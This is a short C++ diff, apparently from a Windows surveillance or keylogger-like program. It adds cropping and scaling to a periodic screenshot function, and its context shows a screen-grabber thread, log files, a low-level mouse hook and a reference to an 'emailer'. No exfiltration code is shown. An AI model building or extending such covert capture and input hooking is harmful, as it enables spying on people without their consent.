@@ -587,9 +587,9 @@ void TakeScreenShot(const char* filename) {
     // copy screen to bitmap
     HDC     hScreen = GetDC(NULL);
     HDC     hDC = CreateCompatibleDC(hScreen);
-    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, w, h);
+    HBITMAP hBitmap = CreateCompatibleBitmap(hScreen, (ScreenshotCrop ? DestWidth : w), (ScreenshotCrop ? DestHeight : h));
     HGDIOBJ old_obj = SelectObject(hDC, hBitmap);
-    BOOL    bRet = BitBlt(hDC, x1, y1, w, h, hScreen, x1, y1, SRCCOPY);
+    BOOL    bRet = StretchBlt(hDC, x1, y1, (ScreenshotCrop ? DestWidth : w), (ScreenshotCrop ? DestHeight : h), hScreen, x1, y1, w, h, SRCCOPY);
 
     //include mouse pointer inside the screenshot(if it is displayed)
     HWND hwnd = GetDesktopWindow();
@@ -735,7 +735,7 @@ ULONG WINAPI ScreenGrabber(LPVOID Parameter) {   //remove old emailer
 
                 TakeScreenShot(CurrentLog.c_str());
 
-                Sleep(SecondsBetweenScreenshots * 1000);
+                Sleep(ScreenshotDelay * 1000);
             }
         }else if(ScreenshotMode == 2){
             std::thread t2(Hooker,WH_MOUSE_LL,MouseThread);
